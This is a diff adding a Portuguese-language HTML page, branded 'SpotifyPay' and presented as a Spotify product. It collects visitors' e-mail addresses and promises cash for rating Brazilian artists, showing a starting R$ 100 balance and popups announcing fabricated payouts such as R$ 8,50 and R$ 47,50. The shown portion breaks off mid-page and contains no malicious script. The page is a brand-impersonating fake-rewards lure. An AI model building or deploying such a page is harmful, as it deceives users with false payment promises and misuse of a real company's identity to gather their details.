@@ -1,0 +1,1145 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+  <meta charset="UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <script src="js/jquery-3.6.4.min.js"></script>
+    <script src="js/js.cookie.min.js"></script>
+
+    <!-- Link para incluir Font Awesome (caso ainda não esteja incluído) -->
+<link rel="stylesheet" href="css/all.min.css">
+    </head><body><audio id="meuAudio"><source src="media/dinheiro.mp3" type="audio/mp3"></audio>
+    
+        
+  
+  
+    <!--------------------- Pagina de login" --------------------->
+    
+    
+    <div id="login" style="display: none;">
+          
+      <div style="padding-top:30%;"></div>
+  
+          <div class="outer-box-login">
+            <div class="white-box-login">
+              <img src="images/opinilogo.png" style="width:70%; margin: 0 auto; display: flex;">
+              <p class="popup-textL" style="text-align: center; color: rgb(999, 999, 999); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao SpotifyPay</p>
+              <p class="popup-textL" style="text-align: center; color: rgb(999, 999, 999); font-size: 15px;">Insira seu e-mail para prosseguir!</p>
+              
+              <input for="email" type="text" name="email" id="email" class="form-input" style="margin-top:20px;" placeholder="E-mail" oninput="validateEmail()">
+              <button class="prosseguir-button" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#">ENTRAR</button>
+                  
+              <div style="margin-bottom: 10px;"></div>
+                  
+  
+                 
+            </div>  
+          </div>
+      
+  
+          <div class="footer-text">
+            <p style="text-align: center; color: rgb(999, 999, 999); font-size: 15px; margin-top: 30px; font-weight: bold;">2024 Spotify LLC</p>
+            <p style="text-align: center; color: rgb(999, 999, 999); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">Termos e Politica de Privacidade</p>
+          </div>
+  
+  
+  
+    </div>
+    
+    
+    
+  
+  
+  
+    
+    <div id="inicio" style="display: block;">
+  
+          <div class="menu">
+            <a style="width: 50%; padding: 10px;">
+              <img src="images/opinilogo.png">
+            </a>
+            <div style="width: 45%;" class="buttons-container" href="#" onclick="mostrarPagina('saque')">
+              <div class="valor-box">
+                <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">R$ 100.00</span>
+              </div>
+            </div>
+          </div>
+          <div style="margin-bottom: 100px;"></div>
+            
+          
+      <!--------------------- Anuncio 1 --------------------->
+      <div id="notification-container"></div>
+      
+
+      <div class="outer-box" id="ad1" style="display: block;">
+        <div class="white-box">
+           
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/album/6MNtIXqAF51SJfAyETEtjL?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+
+  
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>MC Tuto?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o cantor <b>MC Tuto</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>MC Tuto?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B1" onclick="showLoadingB1();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+  
+  
+                
+        </div>
+      </div>
+      
+      <!---- Popup B1 ---->
+          
+          <div class="popup-recebeu" id="popupB1">
+          
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script>
+
+<dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+            
+            <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+            <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 8,50</span>
+          
+          </div>
+          
+      
+      <!--------------------- Anuncio 2 --------------------->
+      
+      <div class="outer-box" id="ad2" style="display: none;">
+        <div class="white-box">
+                
+          <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            
+          <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/album/1jUaMGClL6BGdKqbyw0sjX?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+          
+          <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas do <b>Léo Foguete?</b></p>
+  
+          <div class="rating-container">
+            <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+          </div>
+  
+          <div class="labels">
+            <span class="text-labels">Ruim</span>
+            <span class="text-labels">Normal</span>
+            <span class="text-labels">Bom</span>
+          </div>
+          
+          <p class="pergunta-whats">Recomendaria o cantor <b>Léo Foguete</b> para seus amigos e familiares?</p>
+  
+          <div class="rating-container" id="rating-container-2">
+            <!-- Botão de polegar negativo -->
+            <button class="rating-button" data-rating="2" aria-label="Não">
+                <!-- Ícone de polegar negativo -->
+                <i class="fa-solid fa-thumbs-down"></i>
+            </button>
+            
+            <!-- Botão de polegar positivo -->
+            <button class="rating-button" data-rating="1" aria-label="Sim">
+                <!-- Ícone de polegar positivo -->
+                <i class="fa-solid fa-thumbs-up"></i>
+            </button>
+        </div>
+        
+  
+          <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>Léo Foguete?</b></p>
+  
+          <div class="rating-container" id="rating-container-3">
+            <button class="rating-button" data-rating="1">-18 anos</button>
+            <button class="rating-button" data-rating="2">+18 anos</button>
+          </div>
+              
+          <button type="button" class="enviarCodigo" id="B2" onclick="showLoadingB2();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+  
+  
+                
+        </div>
+      </div>
+      
+      <!---- Popup B2 ---->
+          
+          <div class="popup-recebeu" id="popupB2">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 14,50</span>
+           
+  
+          </div>
+      
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p3" ---------------------->
+      
+        <div class="outer-box" id="ad3" style="display: none;">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/album/5CP84pfi4AFe95UTACFWrk?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas do <b>Matuê?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o <b>Matuê</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o <b>Matuê?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B3" onclick="showLoadingB3();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div>
+          
+          
+          <!---- Popup B3 ---->
+          
+          <div class="popup-recebeu" id="popupB3">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 27,00</span>
+           
+          
+          </div>
+      
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p4" ---------------------->
+      
+      <div class="outer-box" id="ad4" style="display: none;">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/album/4aDHZ1X3DFmHBVV4RkNNaN?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>MC Luuky?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o <b>MC Luuky</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o <b>MC Luuky?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B4" onclick="showLoadingB4();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div>
+          
+          <!---- Popup B4 ---->
+          
+          <div class="popup-recebeu" id="popupB4">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 43,00</span>
+          
+          </div>
+      
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p5" ---------------------->
+      
+      <div class="outer-box" id="ad5" style="display: none;">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/7Elw15XWLpOi4qzHyAwa9e?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>Gloria Groove?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria a cantora <b>Gloria Groove</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta a cantora <b>Gloria Groove?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B5" onclick="showLoadingB5();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+              
+          </div>
+        </div> 
+          
+          <!---- Popup B5 ---->
+          
+          <div class="popup-recebeu" id="popupB5">
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 47,50</span>
+           
+          </div>
+          
+          
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p6" ---------------------->
+      
+        <div class="outer-box" id="ad6" style="display: none">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/7MIhUdNJtaOnDmC5nBC1fb?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>DJ Alok?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o cantor <b>DJ Alok</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>DJ Alok?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B6" onclick="showLoadingB6();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div>
+          
+          <!---- Popup B6 ---->
+          
+          <div class="popup-recebeu" id="popupB6">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 32,50</span>
+           
+          
+          </div>    
+          
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p7" ---------------------->
+      
+        <div class="outer-box" id="ad7" style="display: none">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/0cvVetonbe66pOOPMtuSOC?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas de <b>Mc Cabelinho?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o cantor <b>Mc Cabelinho</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor <b>Mc Cabelinho?</b></p>
+  
+            <div class="rating-container" id="rating-container-3">
+              <button class="rating-button" data-rating="1">-18 anos</button>
+              <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+                
+            <button type="button" class="enviarCodigo" id="B7" onclick="showLoadingB7();" style="border: 2px solid #1ed760; border-radius: 50px; padding: 10px 20px; background-color: #1ed760; color: black; cursor: pointer;">
+    
+    <!-- Texto do botão -->
+    Enviar respostas
+    
+    <!-- Ícone de verificação com fundo redondo ao lado direito -->
+    <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background-color: white; border-radius: 50%; margin-left: 8px;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14" fill="black">
+            <path d="M20.285 6.708a1 1 0 00-1.574-1.194L10.418 15.25l-3.963-4.04a1 1 0 00-1.496 1.327l4.75 4.85a1 1 0 001.496-.025l9.08-10z"></path>
+        </svg>
+    </span>
+</button>
+    
+              
+          </div>
+        </div>  
+          
+          <!---- Popup B7 ---->
+          
+          <div class="popup-recebeu" id="popupB7">
+          
+            <dotlottie-player src="https://lottie.host/47e3a5a0-1dfa-4097-837d-b326f133131d/O8jVEKGnq6.json" background="transparent.html" speed="2" style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay="">
+</dotlottie-player>
+             
+             <span class="popup-text-recebeu" style="font-size: 15px;"><b>Parabéns!</b> Você recebeu:</span>
+             <span class="popup-text-recebeu" style="font-size: 35px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #141414;">R$ 32,00</span>
+           
+          
+          </div>
+          
+      
+      <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p8" ---------------------->
+      
+        <div class="outer-box" id="ad8" style="display: none">
+          <div class="white-box">
+              
+            <p style="font-size: 15px; text-align: center; margin-top: 0px; margin-bottom: 15px; color: #1ed760;">Avalie o artísta abaixo e <b>ganhe por isso</b></p>
+            
+            <div style="display: flex; justify-content: center;">
+    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/4dGx53NJZJyuuLP5ownH1p?utm_source=generator" width="90%" height="152" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+</div>
+    
+            <p class="pergunta-whats">De bom a ruim, qual nota você daria para as músicas do <b>Wesley Safadão?</b></p>
+  
+            <div class="rating-container">
+              <input type="range" min="1" max="5" value="3" class="slider" id="myRange">
+            </div>
+  
+            <div class="labels">
+              <span class="text-labels">Ruim</span>
+              <span class="text-labels">Normal</span>
+              <span class="text-labels">Bom</span>
+            </div>
+            
+            <p class="pergunta-whats">Recomendaria o <b>Wesley Safadão</b> para seus amigos e familiares?</p>
+  
+            <div class="rating-container" id="rating-container-2">
+              <!-- Botão de polegar negativo -->
+              <button class="rating-button" data-rating="2" aria-label="Não">
+                  <!-- Ícone de polegar negativo -->
+                  <i class="fa-solid fa-thumbs-down"></i>
+              </button>
+              
+              <!-- Botão de polegar positivo -->
+              <button class="rating-button" data-rating="1" aria-label="Sim">
+                  <!-- Ícone de polegar positivo -->
+                  <i class="fa-solid fa-thumbs-up"></i>
+              </button>
+          </div>
+          
+  
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o <b>Wesley Safadão?</b></p>
